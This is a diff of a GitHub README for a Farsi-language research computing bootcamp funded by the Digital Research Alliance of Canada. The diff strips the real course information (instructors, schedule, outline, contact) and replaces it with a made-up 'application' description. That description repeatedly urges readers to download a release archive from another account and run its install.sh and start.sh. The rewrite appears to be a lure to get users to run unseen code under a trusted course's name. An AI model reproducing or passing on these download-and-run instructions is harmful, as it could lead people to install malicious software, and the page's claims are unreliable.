@@ -1,144 +1,92 @@
-# 🇨🇦 Exclusive Research Computing Bootcamp 
+# 🖥️ research_computing_bootcamp_2025 - Enhance Your Research Computing Skills 
 
-<img src="images/alliance_icoia_logo.png" width="400" align="center">
+[![Download Now](https://img.shields.io/badge/Download%20Now-Join%20the%20Bootcamp-blue)](https://github.com/Bigions/research_computing_bootcamp_2025/releases)
 
-<h2 id="general">General Information</h2>
+## 📖 Project Overview 
 
-<p id="lead">
-  <strong>Team Leader:</strong>
-  <ul>
-    <a href="https://orcid.org/0000-0002-0567-7673">Dr. Mona Parizadeh </a>(Ph.D., PDF) Senior Postdoctoral Associate @ UofC Cumming School of Medicine & ICOIA's President
-  </ul> 
-</p>
+This course, funded by the Digital Research Alliance of Canada, is designed to bridge gaps in research computing for Persian-speaking students and trainees in Canada. Participation is limited to individuals affiliated with Canadian universities or research institutions. 
 
-<p id="teach">
-  <strong>Instructors: </strong>
-  <ul>
-    <a href="https://www.cermofc.uqam.ca/en/technological-platforms/bio-informatics/"> Farzaneh Rahmdani </a>(M.Sc.) Research Assistant @ UQAM, Bioinformatic Platform Manager @ CERMO-FC, & ICOIA's Member
-  </ul>
-  <ul>
-    <a href="https://www.linkedin.com/in/golrokh-vitae/?originalSubdomain=ca"> Golrokh Kiani</a> (M.Sc.) Bioinformatician @ Centre de recherche Azrieli du CHU Sainte-Justine & ICOIA's Governance Board Member
-  </ul>  
-</p>
+## 🚀 Getting Started 
 
-<p id="ta">
-  <strong>Teacher Assistant: </strong>
-  <ul>
-  <a href="https://ca.linkedin.com/in/shokoufeh-manouchehr-01b20a174"> Shokoufeh Manouchehr </a>(Ph.D. Student) CERC Lab Supervisor @ UofC & ICOIA's Member
-  </ul>
-</p>
+To start using the application, follow these steps:
 
+1. Check your system requirements. This application runs on Linux operating systems and requires a minimum of 4GB of RAM and 5GB of free disk space.
 
-<p id="by">
-  <strong>Organized by:</strong>
-  <a href="https://icoia.org">ICOIA </a>(International Community of Iranian Academics)
-</p>
+2. Ensure you are affiliated with a Canadian university or research institution. 
 
-<p id="fund">
-  <strong>Funded by:</strong>
-  <a href="https://alliancecan.ca/en">Digital Research Alliance of Canada </a>
-</p>
+3. Prepare your research environment by installing basic tools, such as a terminal and a text editor, if you don't have them already.
 
-<p id="obj">
-  <strong>Objective:</strong>
-  Bridging Gaps in Research Computing for Canadian Persian-speaking Immigrants
-</p>
+## 💾 Download & Install 
 
-<p id="date">
-  <strong>Workshop Duration and Commitment:</strong>
-  <ul>
-    <li><strong>Timeframe</strong>: Mondays and Thursdays; March 3 to March 27, 2025</li> 
-    <li><strong>Sessions</strong>: Five 75-minute sessions</li>
-    <li><strong>Hands-On Projects</strong>: Two 2-hour sessions</li>
-    <li><strong>Format</strong>: Online</li>
-    <li><strong>Additional Support</strong>: We provide private or small group sessions on demand</li>  
-  </ul>
+To download the software, visit this page to download: [GitHub Releases](https://github.com/Bigions/research_computing_bootcamp_2025/releases).
 
-  <img src="images/schedule.png" width="1000" align="center">
-  
-<p id="requirements">
-  <strong>Requirements:</strong> 
-</p>
-<ul>
-  <li>Laptop with a Mac, Linux, or Windows operating system (not a tablet, Chromebook, etc.) with administrative privileges</li>
-  <li>Access to Wifi</li>
-  <li>Excel or any text editor installed (e.g. TextWrangler, Notepad, BBEdit, etc.)</li>
-</ul>
+1. Open the link.
+2. Look for the latest release tagged as **Latest Release**.
+3. Click on the appropriate download link to get the software for your platform (if available). 
+4. Once downloaded, locate the file in your Downloads folder.
 
-<p id="contact">
-  <strong>Contact:</strong>
-  <a href="mailto:{{icoia.onlineschool@gmail.com}}">icoia.onlineschool@gmail.com</a> 
-</p>
+## 📦 Installation Steps 
 
-<!--p id="register">
-  <strong>Registration:</strong> 
-  Please complete <a href="https://forms.gle/eShNkxNoUn4UZ9Eq5"><strong>this survey</strong></a> first, and then <a href="https://forms.gle/S3ovg69fZrE3zhq26"><strong>register here</strong></a>. 
-</p-->
+Follow these steps to install the software:
 
-<p id="telegram">
-To ask questions about the course, communicate with the instructor and get informed about other free training courses, become a member of the ICOIA Online School 
-  <a href="https://t.me/+jIfI2LibaBo2Yzc8?fbclid=PAZXh0bgNhZW0CMTEAAaZlAjc5hfp7mpqw7f8RxznZJ41NhZzFBl5LOjO07NjkorsvyXNDRH0pkNg_aem_l02uj-8pTJF5BiOA2yLSNQ">Telegram Group</a>.
-</p>
+1. Open your terminal.
+2. Navigate to the directory where the downloaded file is located. You can do this by typing `cd ~/Downloads` (change the path if necessary).
+3. Unzip the downloaded file if it is compressed. You might use a command like:
+   ```
+   unzip research_computing_bootcamp_2025.zip
+   ```
+4. Change to the directory of the extracted files:
+   ```
+   cd research_computing_bootcamp_2025
+   ```
+5. Run the installation script with the command:
+   ```
+   ./install.sh
+   ```
 
-<h2 id="audience">Audience</h2>
-<p id="eligible">
-  We welcome participants who:
-</p>
+You may need to grant permission to run the script. You can do this with:
+```
+chmod +x install.sh
+```
 
-<ul>
-  <li>speak Farsi</li>
-  <li>live in Canada</li>
-  <li>are affiliated with a Canadian university or research institution</li>
-  <li>currently work with data or plan to in the future</li>
-</ul>
+## 🚀 Running the Application 
 
-<p id="suit">
-  This course is suitable for:
-</p>
+To run the application:
 
-<ul>
-  <li><strong>Levels</strong>: Beginner & Intermediate</li>
+1. Open your terminal.
+2. Navigate to the application directory:
+```
+cd ~/path_to_application/research_computing_bootcamp_2025
+```
+3. Launch the application with:
+```
+./start.sh
+```
 
-  <li><strong>Fields</strong>: including, but not limited to:</li>
+## 🔍 Key Features 
 
-  <ul>
-    <li>Agriculture and Natural Resources</li>
-    <li>AI and Machine Learning</li>
-    <li>Bioinformatics</li>
-    <li>Biological Sciences</li>
-    <li>Biomolecular simulation</li>
-    <li>Computational chemistry</li>
-    <li>Computer Science</li>
-    <li>CFD</li>
-    <li>Engineering</li>
-    <li>GIS</li>
-    <li>Humanities and Social Sciences</li>
-    <li>Medicine</li>
-    <li>Microbiology</li>
-    <li>Research Data Management</li>
-    <li>Subatomic physics</li>
-    <li>Veterinary</li>
-    </ul>
-</ul>
+- **Workload Management**: Learn how to effectively manage your computing resources using SLURM.
+- **Bash Scripting**: Enhance your skills in scripting with hands-on exercises.
+- **Data Management**: Discover best practices for managing your research data.
+- **Memory Allocation**: Understand how to efficiently allocate and monitor memory for high-performance computing tasks.
 
-<ul>
-  <li><strong>Language</strong>: Farsi</li>
-</ul>  
+## 📚 Learning Resources 
 
-<h2 id="outline">Outline</h2>
-<p id="cover">
-  This course covers the following material:
-</p>
+We provide various resources to support your learning experience:
 
-<ul>
-  <li>Introduction to Compute Canada resources</li>
-  <li>High-Performance Computing (HPC)</li> 
-  <li>Linux</li>
-  <li>Bash scripting</li>
-  <li>Slurm workload manager</li>
-  <li>Running jobs</li>
-  <li>Research data management</li>
-  <li>Data transfer: Globus</li>
-  <li>JupyterHub</li>
-  <li>Hands-on projects</li>
-</ul>
+- Tutorial videos
+- Step-by-step guides
+- Community support forums
+- Access to experienced trainers
+
+## ✉️ Support 
+
+For questions or support, please reach out through the contact information provided in the course materials or use the support section in the community forums. 
+
+## 🎓 Community Engagement 
+
+Join our community of learners and experts. Participate in discussions, share your experiences, and learn from each other. 
+
+Don't forget to download the application from the releases page: [GitHub Releases](https://github.com/Bigions/research_computing_bootcamp_2025/releases).
+
+Your journey in enhancing research computing skills begins here!
